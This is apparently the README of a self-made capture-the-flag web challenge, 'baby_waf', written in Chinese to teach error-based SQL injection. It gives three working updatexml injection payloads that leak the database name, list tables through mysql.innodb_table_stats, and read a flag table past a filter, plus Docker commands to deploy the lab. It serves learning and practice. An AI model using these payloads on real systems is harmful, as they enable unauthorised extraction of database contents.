# baby_waf

学习web时自己出（chaoxi）的一道题。

知识点是报错注入。

## payload

```
?id=-1'||updatexml(1,concat(0x7e,database(),0x7e),1)||'1'='1

?id=-1'||updatexml (1,concat(0x7e,(select(group_concat(table_name))from(mysql.innodb_table_stats)where(database_name='ctftraining')),0x7e),1)||'1'='1

?id=-1'||updatexml (1,concat(0x7e,(select(group_concat(`1`))from(select(1)union(select*from(flag)))a),0x7e),1)||'1'='1
```

## 部署

```shell
sudo docker build -f dockerfile -t prcuzz_waf .
sudo docker run -P prcuzz_waf
```

